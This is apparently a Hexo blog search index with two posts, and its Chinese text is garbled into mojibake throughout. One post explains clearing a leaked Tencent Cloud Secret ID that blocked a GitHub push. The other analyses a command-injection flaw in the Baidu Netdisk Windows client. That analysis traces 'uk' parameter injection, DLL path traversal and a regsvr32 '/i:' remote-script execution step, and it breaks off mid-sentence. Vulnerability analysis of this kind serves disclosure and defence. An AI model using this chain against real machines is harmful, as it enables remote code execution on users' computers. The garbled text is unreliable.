<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GitHubæ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯å¤„ç†æ–¹æ¡ˆ</title>
    <link href="/2025/09/05/GitHub%E6%A3%80%E6%B5%8B%E5%88%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    <url>/2025/09/05/GitHub%E6%A3%80%E6%B5%8B%E5%88%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<p>å­˜ä¸ªæŠ¥é”™çš„è§£å†³æ–¹æ¡ˆï¼Œä¹‹å‰æ²¡é‡åˆ°è¿‡</p><h1 id="é—®é¢˜åŸå› "><a href="#é—®é¢˜åŸå› " class="headerlink" title="é—®é¢˜åŸå› "></a>é—®é¢˜åŸå› </h1><p>ç”¨å…ƒå®çš„æ—¶å€™ç›´æ¥å°†å…ƒå®ç»™æˆ‘çš„å›¾ç‰‡é“¾æ¥æ’åˆ°äº†æ–‡ç« é‡Œï¼Œæ²¡æœ‰æ³¨æ„åˆ°å…ƒå®ç»™ä½ çš„å›¾ç‰‡é“¾æ¥æ˜¯ä¼šå¸¦ç€ä½ çš„è…¾è®¯äº‘Secret IDï¼Œæ‰€ä»¥gitæŠ¥é”™äº†</p><p>æŠ¥é”™å†…å®¹å¦‚ä¸‹ï¼ŒåŒæ—¶æˆ‘åœ¨åˆ é™¤æºæ–‡ä»¶åä¹Ÿå°±æ˜¯<code>2025/09/05/ç™¾åº¦ç½‘ç›˜7.59 Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´/index.html</code>è¿™ä¸ªæ–‡ä»¶åè¿˜æ˜¯æŠ¥é”™ï¼Œé‚£å¤§æ¦‚ç‡å°±æ˜¯gitè‡ªå·±çš„ç¼“å­˜ä¾æ—§å­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦æ¸…é™¤ç¼“å­˜é‡æ–°ç”Ÿæˆ</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">remote:</span> Resolving <span class="hljs-params">deltas:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">61</span><span class="hljs-operator">/</span><span class="hljs-number">61</span>), completed <span class="hljs-keyword">with</span> <span class="hljs-number">24</span> local objects.<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> <span class="hljs-params">GH013:</span> Repository rule violations found for refs<span class="hljs-symbol">/heads/main.</span><br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span> <span class="hljs-operator">-</span> GITHUB PUSH PROTECTION<br><span class="hljs-params">remote:</span>   â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br><span class="hljs-params">remote:</span>     Resolve the following violations before pushing again<br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span>     <span class="hljs-operator">-</span> Push cannot contain secrets<br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>      (<span class="hljs-operator">?</span>) Learn how to resolve a blocked push<br><span class="hljs-params">remote:</span>      https:<span class="hljs-operator">//</span>docs.github.com<span class="hljs-operator">/</span>code-security<span class="hljs-operator">/</span>secret-scanning<span class="hljs-operator">/</span>working-<span class="hljs-keyword">with</span>-secret-scanning-and-push-protection<span class="hljs-operator">/</span>working-<span class="hljs-keyword">with</span>-push-protection-from-the-command-line<span class="hljs-comment">#resolving-a-blocked-push</span><br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>       â€”â€” Tencent Cloud Secret ID â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br><span class="hljs-params">remote:</span>        <span class="hljs-params">locations:</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>ç™¾åº¦ç½‘ç›˜<span class="hljs-number">7.59</span> Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´<span class="hljs-operator">/</span>index.html:<span class="hljs-number">32</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>ç™¾åº¦ç½‘ç›˜<span class="hljs-number">7.59</span> Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´<span class="hljs-operator">/</span>index.html:<span class="hljs-number">34</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>ç™¾åº¦ç½‘ç›˜<span class="hljs-number">7.59</span> Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´<span class="hljs-operator">/</span>index.html:<span class="hljs-number">303</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> <span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">09</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span>ç™¾åº¦ç½‘ç›˜<span class="hljs-number">7.59</span> Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´<span class="hljs-operator">/</span>index.html:<span class="hljs-number">322</span><br><span class="hljs-params">remote:</span>          <span class="hljs-operator">-</span> <span class="hljs-params">commit:</span> <span class="hljs-number">105</span>a8fc43f4e05ebfdf83c1263a0ed44f226bc3e<br><span class="hljs-params">remote:</span>            <span class="hljs-params">path:</span> local-search.xml:<span class="hljs-number">11</span><br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span>        (<span class="hljs-operator">?</span>) To push, remove secret from commit(s) <span class="hljs-keyword">or</span> follow this URL to allow the secret.<br><span class="hljs-params">remote:</span>        https:<span class="hljs-symbol">//github.com/t0pbarry/t0pbarry.github.io/security/secret-scanning/unblock-secret/32HuSRm4czIzDbv1DCmPZqLBsKK</span><br><span class="hljs-params">remote:</span>     <br><span class="hljs-params">remote:</span> <br><span class="hljs-params">remote:</span> <br>To https:<span class="hljs-symbol">//github.com/t0pbarry/t0pbarry.github.io.git</span><br> <span class="hljs-operator">!</span> [remote rejected] HEAD <span class="hljs-operator">-&gt;</span> main (push declined due to repository rule violations)<br><span class="hljs-params">error:</span> failed to push some refs to &#x27;https:<span class="hljs-operator">//</span>github.com<span class="hljs-operator">/</span>t0pbarry<span class="hljs-operator">/</span>t0pbarry.github.io.git&#x27;<br>FATAL Something&#x27;s wrong. Maybe you can find the solution <span class="hljs-params">here:</span> https:<span class="hljs-symbol">//hexo.io/docs/troubleshooting.html</span><br><span class="hljs-params">Error:</span> Spawn failed<br>    at ChildProcess.<span class="hljs-symbol">&lt;anonymous&gt;</span> (<span class="hljs-operator">/</span>Users<span class="hljs-operator">/</span>winter<span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>MyArticle<span class="hljs-operator">/</span>hexo<span class="hljs-operator">/</span>hexo-blog<span class="hljs-operator">/</span>node_modules<span class="hljs-operator">/</span>hexo-deployer-git<span class="hljs-operator">/</span>node_modules<span class="hljs-operator">/</span>hexo-util<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>spawn.js:<span class="hljs-number">51</span>:<span class="hljs-number">21</span>)<br>    at ChildProcess.emit (node:events:<span class="hljs-number">507</span>:<span class="hljs-number">28</span>)<br>    at ChildProcess._handle.onexit (node:internal<span class="hljs-operator">/</span>child_process:<span class="hljs-number">294</span>:<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure><h1 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h1><p>æ ¹æ®æ‚¨æä¾›çš„Hexoéƒ¨ç½²æ—¥å¿—å’ŒGitHubæ¨é€é”™è¯¯ï¼Œé—®é¢˜æ ¸å¿ƒåœ¨äº <strong>ç”Ÿæˆçš„é™æ€æ–‡ä»¶ï¼ˆ<code>index.html</code>å’Œ<code>local-search.xml</code>ï¼‰ä¸­åŒ…å«ç¡¬ç¼–ç çš„è…¾è®¯äº‘Secret ID</strong>ï¼Œè§¦å‘GitHubæ¨é€ä¿æŠ¤æœºåˆ¶ã€‚ä»¥ä¸‹æ˜¯å®Œæ•´è§£å†³æ–¹æ¡ˆï¼š</p><hr><h3 id="ğŸ”-é—®é¢˜æ ¹æº"><a href="#ğŸ”-é—®é¢˜æ ¹æº" class="headerlink" title="ğŸ” é—®é¢˜æ ¹æº"></a>ğŸ” é—®é¢˜æ ¹æº</h3><ol><li><p><strong>æ•æ„Ÿä¿¡æ¯æ³„éœ²ç‚¹</strong><br>GitHubæ£€æµ‹åˆ°ä»¥ä¸‹æ–‡ä»¶ä¸­å­˜åœ¨è…¾è®¯äº‘Secret IDï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">- /<span class="hljs-number">2025</span>/<span class="hljs-number">09</span>/<span class="hljs-number">05</span>/ç™¾åº¦ç½‘ç›˜<span class="hljs-number">7.59</span> Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´/<span class="hljs-keyword">index</span>.html<br>  â†’ ç¬¬<span class="hljs-number">32</span>ã€<span class="hljs-number">34</span>ã€<span class="hljs-number">303</span>ã€<span class="hljs-number">322</span>è¡Œ<br>- /<span class="hljs-keyword">local</span>-<span class="hljs-keyword">search</span>.xml â†’ ç¬¬<span class="hljs-number">11</span>è¡Œ<br></code></pre></td></tr></table></figure></li><li><p><strong>ä¿¡æ¯æ³„éœ²è·¯å¾„</strong></p><table><thead><tr><th align="left">æ–‡ä»¶ç±»å‹</th><th align="left">ç”Ÿæˆæ¥æº</th><th align="left">æ•æ„Ÿä¿¡æ¯ä½ç½®</th></tr></thead><tbody><tr><td align="left"><code>index.html</code></td><td align="left">Hexoç¼–è¯‘Markdownæ–‡ç« ç”Ÿæˆ</td><td align="left">æ–‡ç« ä»£ç ç‰‡æ®µ</td></tr><tr><td align="left"><code>local-search.xml</code></td><td align="left"><code>hexo-generator-search</code>æ’ä»¶ç”Ÿæˆ</td><td align="left">æ–‡ç« å†…å®¹ç´¢å¼•</td></tr></tbody></table></li></ol><hr><h3 id="ğŸ› ï¸-ä¿®å¤æ–¹æ¡ˆ"><a href="#ğŸ› ï¸-ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ğŸ› ï¸ ä¿®å¤æ–¹æ¡ˆ"></a>ğŸ› ï¸ ä¿®å¤æ–¹æ¡ˆ</h3><h4 id="âœ…-æ­¥éª¤1ï¼šå®šä½å¹¶æ¸…é™¤æ•æ„Ÿä¿¡æ¯"><a href="#âœ…-æ­¥éª¤1ï¼šå®šä½å¹¶æ¸…é™¤æ•æ„Ÿä¿¡æ¯" class="headerlink" title="âœ… æ­¥éª¤1ï¼šå®šä½å¹¶æ¸…é™¤æ•æ„Ÿä¿¡æ¯"></a>âœ… æ­¥éª¤1ï¼šå®šä½å¹¶æ¸…é™¤æ•æ„Ÿä¿¡æ¯</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 1. å®šä½åŒ…å«Secret IDçš„æºæ–‡ä»¶</span><br>grep -r <span class="hljs-string">&quot;AKID&quot;</span> <span class="hljs-string">./source/_posts/</span><br><br><span class="hljs-comment"># 2. ç¼–è¾‘æ¼æ´æ–‡ç« Markdownæ–‡ä»¶</span><br><span class="hljs-comment"># æ–‡ä»¶è·¯å¾„ï¼šsource/_posts/ç™¾åº¦ç½‘ç›˜7.59 Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´.md</span><br><span class="hljs-comment"># åˆ é™¤ä»¥ä¸‹è¡Œä¸­çš„è…¾è®¯äº‘Secret IDï¼š</span><br><span class="hljs-comment">#   - ç¬¬32è¡Œé™„è¿‘ï¼šPOCè¯·æ±‚ç¤ºä¾‹</span><br><span class="hljs-comment">#   - ç¬¬34è¡Œé™„è¿‘ï¼šXMLä»£ç å—</span><br><span class="hljs-comment">#   - ç¬¬303/322è¡Œé™„è¿‘ï¼šå¤ç°æ­¥éª¤</span><br><br><span class="hljs-comment"># 3. éªŒè¯æ¸…ç†ç»“æœ</span><br>grep <span class="hljs-string">&quot;AKID&quot;</span> <span class="hljs-string">./source/_posts/</span>*<span class="hljs-string">.md</span>  <span class="hljs-comment"># åº”æ— è¾“å‡º</span><br></code></pre></td></tr></table></figure><h4 id="âœ…-æ­¥éª¤2ï¼šé‡ç½®Hexoç”Ÿæˆç¼“å­˜"><a href="#âœ…-æ­¥éª¤2ï¼šé‡ç½®Hexoç”Ÿæˆç¼“å­˜" class="headerlink" title="âœ… æ­¥éª¤2ï¼šé‡ç½®Hexoç”Ÿæˆç¼“å­˜"></a>âœ… æ­¥éª¤2ï¼šé‡ç½®Hexoç”Ÿæˆç¼“å­˜</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># æ¸…é™¤æ—§ç¼–è¯‘æ–‡ä»¶</span><br>hexo clean<br><br><span class="hljs-comment"># é‡æ–°ç”Ÿæˆé™æ€æ–‡ä»¶ï¼ˆç¡®ä¿æ— æ•æ„Ÿä¿¡æ¯ï¼‰</span><br>hexo generate<br><br><span class="hljs-comment"># æ£€æŸ¥ç”Ÿæˆæ–‡ä»¶</span><br>grep <span class="hljs-string">&quot;AKID&quot;</span> <span class="hljs-string">./public/</span>**/*<span class="hljs-string">.html</span> <span class="hljs-string">./public/</span>*<span class="hljs-string">.xml</span>  <span class="hljs-comment"># åº”æ— è¾“å‡º</span><br></code></pre></td></tr></table></figure><h4 id="âœ…-æ­¥éª¤3ï¼šå®‰å…¨éƒ¨ç½²"><a href="#âœ…-æ­¥éª¤3ï¼šå®‰å…¨éƒ¨ç½²" class="headerlink" title="âœ… æ­¥éª¤3ï¼šå®‰å…¨éƒ¨ç½²"></a>âœ… æ­¥éª¤3ï¼šå®‰å…¨éƒ¨ç½²</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># å¼ºåˆ¶æ›´æ–°éƒ¨ç½²ä»“åº“</span><br>rm -rf <span class="hljs-string">.deploy_git</span>  <span class="hljs-comment"># åˆ é™¤æ—§éƒ¨ç½²ç¼“å­˜</span><br>hexo <span class="hljs-keyword">deploy</span> <span class="hljs-comment"># æ‰§è¡Œåˆ°è¿™é‡Œå·²ç»ä¸€åˆ‡æ­£å¸¸äº†</span><br></code></pre></td></tr></table></figure><hr><h3 id="âš ï¸-å¯†é’¥ç®¡ç†å¼ºåŒ–"><a href="#âš ï¸-å¯†é’¥ç®¡ç†å¼ºåŒ–" class="headerlink" title="âš ï¸ å¯†é’¥ç®¡ç†å¼ºåŒ–"></a>âš ï¸ å¯†é’¥ç®¡ç†å¼ºåŒ–</h3><ol><li><p><strong>ç«‹å³é‡ç½®æ³„éœ²å¯†é’¥</strong><br>ç™»å½•è…¾è®¯äº‘æ§åˆ¶å° â†’ è®¿é—®å¯†é’¥ â†’ ç¦ç”¨&#x2F;åˆ é™¤æ³„éœ²çš„Secret IDã€‚</p></li><li><p><strong>é¢„é˜²ç¡¬ç¼–ç </strong><br>åœ¨Markdownä¸­ä½¿ç”¨â€‹<strong>â€‹ç¯å¢ƒå˜é‡å ä½ç¬¦â€‹</strong>â€‹ï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">```xml</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- é”™è¯¯æ–¹å¼ --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">secret_id</span>&gt;</span>AKID[ç›´æ¥è·ŸID]<span class="hljs-tag">&lt;/<span class="hljs-name">secret_id</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- æ­£ç¡®æ–¹å¼ --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">secret_id</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">env.TENCENT_SECRET_ID</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">secret_id</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less">é€šè¿‡<span class="hljs-selector-tag">Hexo</span>çš„<span class="hljs-selector-attr">[ç¯å¢ƒå˜é‡æ’ä»¶]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/hexojs/hexo-inject-env)åŠ¨æ€æ³¨å…¥ã€‚</span><br></code></pre></td></tr></table></figure></li><li><p><strong>æäº¤å‰æ‰«æ</strong><br>å®‰è£…é¢„æäº¤æ£€æµ‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…GitLeaks</span><br>brew install gitleaks<br><br><span class="hljs-comment"># æ·»åŠ é¢„æäº¤é’©å­</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;gitleaks protect --staged -v&#x27;</span> &gt; .git/hooks/pre-commit<br><span class="hljs-built_in">chmod</span> +x .git/hooks/pre-commit<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç™¾åº¦ç½‘ç›˜7.59 Windowså®¢æˆ·ç«¯å‘½ä»¤æ³¨å…¥æ¼æ´</title>
    <link href="/2025/09/05/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%987.59%20Windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/09/05/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%987.59%20Windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h1><p><strong>ç‰ˆæœ¬å°äºç­‰äº7.59.5.104</strong></p><p>åªå­˜åœ¨äºWindowsç‰ˆæœ¬å®¢æˆ·ç«¯</p><p>YunDetectService.exeç›‘å¬æœ¬åœ°10000ç«¯å£ï¼Œè€Œä¸”è¿™ä¸ªæ˜¯ç¨‹åºæ˜¯å¼€æœºè‡ªå¯åŠ¨çš„ï¼Œåªè¦ä½ å®‰è£…ç™¾åº¦ç½‘ç›˜å°±æœ‰ï¼Œæ— éœ€ç™»å½•æˆ–è€…å…¶ä»–æ¡ä»¶ï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤æŸ¥çœ‹ç«¯å£æƒ…å†µ</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2021.38.16@2x.png" alt="CleanShot 2025-09-05 at 21.38.16@2x"></p><p>10000ç«¯å£webè¯·æ±‚ï¼ˆç‰ˆæœ¬7.50.0.130ä»¥å‰æ˜¯HTTPï¼Œä¾‹å¦‚æˆ‘çš„macä¸Šçš„ç™¾åº¦ç½‘ç›˜ï¼Œä»¥åçš„ç‰ˆæœ¬å°±æ˜¯HTTPSï¼‰ä»¥methodä¼ é€’å‚æ•°ï¼Œå®ç°ä¸åŒçš„åŠŸèƒ½</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//127.0.0.1:10000/?method=GetVersion</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2021.35.42@2x.png" alt="CleanShot 2025-09-05 at 21.35.42@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2021.36.15@2x.png" alt="CleanShot 2025-09-05 at 21.36.15@2x"></p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>çœ‹äº†ç½‘ä¸Šå¤§éƒ¨åˆ†çš„æ–‡ç« ï¼Œæ„Ÿè§‰æˆå› è¿˜æ˜¯æ¯”è¾ƒå¥½ç†è§£çš„</p><h3 id="æ¼æ´æ ¸å¿ƒæˆå› "><a href="#æ¼æ´æ ¸å¿ƒæˆå› " class="headerlink" title="æ¼æ´æ ¸å¿ƒæˆå› "></a><strong>æ¼æ´æ ¸å¿ƒæˆå› </strong></h3><ol><li><strong>å‘½ä»¤è¡Œæ³¨å…¥æ¼æ´</strong> ç™¾åº¦ç½‘ç›˜æœåŠ¡ <code>YunDetectService.exe</code>ï¼ˆç›‘å¬æœ¬åœ°10000ç«¯å£ï¼‰åœ¨å¤„ç† <code>OpenSafeBox</code> æ¥å£çš„ <code>uk</code> å‚æ•°æ—¶ï¼Œæœªè¿›è¡Œå®‰å…¨è¿‡æ»¤ã€‚ <code>uk</code> å‚æ•°å€¼ç›´æ¥æ‹¼æ¥åˆ° <code>BaiduNetdisk.exe</code> çš„å¯åŠ¨å‚æ•° <code>-userkey</code> ä¸­ï¼Œå¯¼è‡´æ”»å‡»è€…å¯é€šè¿‡æ³¨å…¥é¢å¤–å‘½ä»¤æ“çºµç¨‹åºè¡Œä¸ºã€‚</li></ol><p><img src="https://img1.plumstar.cn/upload5upload5ojdsiahdahdjka.png"></p><ul><li>URL ä¼ é€’å½¢å¼ï¼š</li></ul><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span>=<span class="hljs-title function_">OpenSafeBox</span>&amp;<span class="hljs-title function_">uk</span>=<span class="hljs-title function_">xxxx</span><br></code></pre></td></tr></table></figure><ul><li>ç¨‹åºæ¥æ”¶å½¢å¼ï¼š</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">-opensafebox -userkey <span class="hljs-selector-attr">[å…·ä½“userkeyå€¼]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è®¿é—®è¯¥è¯¥å‚æ•°çœ‹çœ‹ï¼Œå¯ä»¥çœ‹åˆ°å‚æ•°ç¡®å®ä¼ é€’è¿‡å»äº†</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//127.0.0.1:10000/?method=OpenSafeBox&amp;uk=xxxx</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-09-05%20at%2023.53.11@2x.png" alt="CleanShot 2025-09-05 at 23.53.11@2x"></p><p>å…¶ä¸­çš„method ä¸»è¦åŒ…æ‹¬ï¼šGetVersionï¼ŒGetPcCodeï¼ŒDownloadShareItemsï¼ŒDownloadSelfOwnItemsï¼ŒOpenSafeBoxï¼Œinstallï¼Œuserkeyç­‰ï¼Œå…¶ä¸­ï¼Œ<strong>install regdll</strong> åŠŸèƒ½å­˜åœ¨è¿›ä¸€æ­¥çš„å®‰å…¨é£é™©ã€‚</p><ol start="2"><li><strong>å±é™©åŠŸèƒ½è°ƒç”¨ï¼ˆ<code>install regdll</code>ï¼‰</strong> æ³¨å…¥ <code>-install regdll</code> å‘½ä»¤å¯è§¦å‘æ³¨å†ŒDLLåŠŸèƒ½ï¼Œç¨‹åºä¼šè°ƒç”¨ç³»ç»Ÿå·¥å…· <code>regsvr32.exe</code> æ³¨å†Œ <code>YunShellExt.dll</code>ã€‚ <strong>æ–‡ä»¶è·¯å¾„é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æ‹¼æ¥è€Œæˆï¼Œå¯æ§</strong>ï¼šDLLè·¯å¾„é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ç”Ÿæˆï¼Œæ”»å‡»è€…é€šè¿‡è·¯å¾„ç©¿è¶Šï¼ˆ<code>..\</code>ï¼‰å¯æŒ‡å‘ä»»æ„ä½ç½®ï¼ˆå¦‚ç”¨æˆ·ç›®å½•ï¼‰ã€‚</li></ol><p><img src="https://img1.plumstar.cn/upload5uploadjsjsjsjsjsj.png"></p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ <strong>è·¯å¾„ç©¿è¶Šå­—ç¬¦ä¸²</strong> <code>..\</code> æ„é€  DLL çš„çœŸå®è·¯å¾„ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>..<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span>[ç”¨æˆ·å]<span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Roaming<span class="hljs-symbol">\\</span>baidu<span class="hljs-symbol">\\</span>BaiduNetdisk<br></code></pre></td></tr></table></figure><blockquote><blockquote><p>å”¯ä¸€é™åˆ¶ï¼šéœ€è¦æå‰çŸ¥é“å½“å‰ç³»ç»Ÿç”¨æˆ·åã€‚</p></blockquote></blockquote><ol start="3"><li><strong><code>regsvr32.exe</code> äºŒæ¬¡æ³¨å…¥</strong> æ³¨å†ŒDLLæ—¶ï¼Œç¨‹åºç›´æ¥æ‹¼æ¥ <code>regsvr32.exe</code> çš„å‘½ä»¤è¡Œå‚æ•°ä¸”æœªè¿‡æ»¤ï¼Œå…è®¸æ”»å‡»è€… é€šè¿‡åŒå¼•å·æˆªæ–­ä¼ªé€ å‚æ•°è¾¹ç•Œï¼ˆå¦‚ <code>&quot;C:\Windows\System32\scrobj.dll&quot;</code>ï¼‰ã€‚ æ³¨å…¥æ¶æ„å‚æ•° <code>/i:[è¿œç¨‹XML] /u</code>ï¼Œå¼ºåˆ¶ <code>regsvr32.exe</code> 